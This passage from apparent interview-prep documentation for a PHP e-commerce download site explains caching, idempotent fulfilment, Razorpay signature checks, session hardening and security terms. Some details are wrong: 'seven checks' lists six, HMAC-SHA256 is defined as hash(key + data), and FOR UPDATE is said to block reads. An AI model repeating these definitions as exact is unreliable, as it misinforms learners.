    AddOutputFilterByType DEFLATE text/html text/css application/javascript application/json
</IfModule>
```
CSS and JS files are ~60-80% smaller over the wire.

### 6. Browser Caching
```apache
<FilesMatch "\.(css|js|webp|png|jpg|woff2)$">
    Header set Cache-Control "public, max-age=2592000"
</FilesMatch>
```
Static files cached for 30 days. Repeat visitors don't re-download them.

### 7. `INSERT IGNORE` for Idempotency
In `generateDownloadsForOrder()`, tokens are inserted with `INSERT IGNORE`. If the fulfillment runs twice (race condition), the second insert does nothing — no duplicate tokens.

---

## 16. Interview Q&A — Real Questions, Real Answers

---

**Q: Walk me through how a purchase works end-to-end.**

A: When a customer clicks "Pay Now," the browser sends their cart to `api/order/create.php`. The server opens a database transaction, locks each product row with `SELECT FOR UPDATE` to prevent race conditions, validates stock, calculates the total including 18% GST, and creates the order in `awaiting_payment` status. The frontend then calls Razorpay to create a payment order and shows the checkout modal. When the customer completes payment, Razorpay sends three values back to the browser: payment ID, order ID, and a signature. The browser posts these to `api/payment/razorpay-verify.php`, which verifies the HMAC-SHA256 signature using the Razorpay secret key to confirm the data wasn't tampered with. The server fetches the actual amount from Razorpay's API to prevent client-side manipulation, marks the order as paid, and calls `OrderFulfillmentService::fulfillPaidOrder()` which generates download tokens and sends the response to the browser. After the response is flushed, confirmation emails go out.

---

**Q: What happens if the customer's browser crashes after payment but before the verify call runs?**

A: Razorpay sends a webhook to `api/payment/webhook.php` — a server-to-server HTTP call that doesn't depend on the browser. The webhook validates the signature, finds the order, and calls the same fulfillment service. + paths are idempotent: download tokens use `INSERT IGNORE` and emails check timestamp columns in the database before sending, so even if both verify and webhook run simultaneously, no duplicates are created.

---

**Q: How do you prevent a customer from downloading a file they didn't pay for?**

A: Every download goes through `DigitalDownloadService::validateAndServe()` which runs seven checks: 
the token must exist, 
the user ID must match the token owner, 
the resource must be active, 
the order must have payment status 'paid', 
the expiry date must be in the future, and 
the download count must be under the limit. 
Only after passing all checks does the count increment inside a database transaction with `FOR UPDATE` to prevent race conditions on the limit. The actual files sit in `storage/private/` which is blocked by Apache `.htaccess` — there's no direct URL to reach them.

---

**Q: How do you prevent SQL injection?**

A: Every database query uses PDO or MySQLi prepared statements with parameterized inputs. The user's value is bound as a parameter and never concatenated into the query string. The database driver sends the query and the values separately — the database treats the value as a literal string, not as SQL syntax.

---

**Q: How is the user's session secure?**

A: Sessions are configured with `httponly=true` so JavaScript can't read the session cookie, `samesite=Lax` to prevent cross-site request forgery, and `secure=true` on HTTPS to prevent the cookie being sent over plain HTTP. Session files are stored in a custom directory under `storage/sessions/` rather than the system temp folder. Passwords are stored as bcrypt hashes using `password_hash()` with `PASSWORD_DEFAULT`, which includes automatic salting.

---

**Q: What is an idempotent operation? Give an example from your project.**

A: An idempotent operation produces the same result no matter how many times you call it. In this project, `OrderFulfillmentService::fulfillPaidOrder()` is idempotent. It's called by both the browser-side payment verify and the server-side webhook, potentially simultaneously. For download tokens, it uses `INSERT IGNORE` — inserting a duplicate is silently skipped. For emails, it checks the `confirmation_email_sent_at` column before sending — if it's already set, the email is skipped. For inventory reservations, it checks `consumed_at` before consuming. So calling the function twice leaves the same state as calling it once.

---

**Q: How do you handle environment configuration?**

A: All configuration — database credentials, API keys, SMTP settings — is in a `.env` file that is never committed to git. The `core/env.php` file reads this file and populates PHP's environment variables. Any code that needs a value calls `getenv('KEY_NAME')`. This means the same codebase runs on localhost and production by changing only the `.env` file, and no secret ever appears in version control history.

---

**Q: What would you add if you had more time?**

A: Rate limiting on authentication endpoints to prevent brute force attacks. Email verification for new signups. PHPUnit tests for the service layer. A job queue (like Redis + a worker) so the email sending doesn't need to happen in the same PHP process at all — it would be queued and sent asynchronously. Structured logging instead of `error_log()`. And probably migrating the service layer to a framework like Laravel for built-in middleware and ORM support.

---

## 17. Glossary — Terms You Must Know

| Term | Simple Definition | How You Used It |
|---|---|---|
| **REST API** | A way to design web services using HTTP methods (GET, POST) and URLs that represent data | All your `api/` files follow REST |
| **CSRF** | Cross-Site Request Forgery — an attack where another site makes requests using your session | 64-char random token validated on every POST |
| **SQL Injection** | Injecting SQL code through user input | Prevented via prepared statements on every query |
| **XSS** | Cross-Site Scripting — injecting `<script>` tags through input | Prevented via `htmlspecialchars()` on all output |
| **Prepared Statement** | A parameterized SQL query where user values are never interpreted as SQL | `$stmt->bind_param('s', $email)` |
| **bcrypt** | A slow password hashing algorithm designed to resist brute force | `password_hash($pass, PASSWORD_DEFAULT)` |
| **Session** | Server-side storage tied to a browser cookie | Stores user_id after login |
| **HMAC-SHA256** | A signature algorithm: hash(key + data) — verifies data hasn't been tampered with | Used to verify Razorpay payment signatures |
| **Idempotent** | An operation that produces the same result no matter how many times you run it | Fulfillment service — safe to call from webhook AND verify |
| **Webhook** | A server-to-server HTTP call from Razorpay to your server | Backup fulfillment when browser closes mid-payment |
| **Presigned URL** | A time-limited URL with a cryptographic signature that grants access to a cloud file | Used for Cloudflare R2 file downloads |
| **Transaction** | A group of DB queries that either all succeed or all fail together | `BEGIN TRANSACTION` + `COMMIT` in order creation |
| **FOR UPDATE** | A SQL lock that prevents other transactions from reading a row until yours commits | Used on product rows during checkout to prevent overselling |
| **Race Condition** | Two processes reading and writing the same data at the same time, causing inconsistency | Prevented by `FOR UPDATE` on stock and `INSERT IGNORE` on tokens |
| **Migration** | A numbered SQL file that makes one schema change | `005_order_email_tracking_columns.sql` |
| **Soft Delete** | Setting `is_active = 0` instead of deleting a row | Products are deactivated, not deleted — preserves order history |
| **CSP** | Content Security Policy — a header that tells the browser which domains can serve scripts | Set in config.php for every page |
| **GZIP** | Compresses HTTP responses before sending — makes pages load faster | Enabled via `.htaccess` `mod_deflate` |
| **Environment Variable** | A configuration value read from outside the code (`.env` file) | `getenv('RAZORPAY_KEY_SECRET')` |
| **Service Layer** | A class that contains business logic, separate from HTTP handling | `OrderFulfillmentService`, `DigitalDownloadService` |
| **Entropy** | Randomness — how unpredictable a value is | `random_bytes(32)` gives 256 bits of entropy |
| **Paise** | Indian subunit of currency (100 paise = ₹1) | Razorpay amounts are always in paise |
| **GST** | Goods and Services Tax — India's 18% tax | `$tax = round($subtotal * 0.18, 2)` |
| **SMTP** | Simple Mail Transfer Protocol — the protocol used to send emails | PHPMailer connects to SMTP server to send emails |
| **Output Buffer** | PHP buffers all output, lets you send headers later | `ob_start()` at top of config.php |
| **N+1 Problem** | Running one query, then N more queries for each result | Avoided with JOINs in cart and order queries |
| **Debounce** | Delaying a function call to avoid it firing too many times | Cart fetch throttled in JavaScript |
| **AES-256-GCM** | Military-grade symmetric encryption for files at rest | Used to encrypt files stored in `storage/private/` |
| **SigV4** | AWS Signature Version 4 — the standard way to sign S3/R2 API requests | Used to generate presigned URLs for Cloudflare R2 |
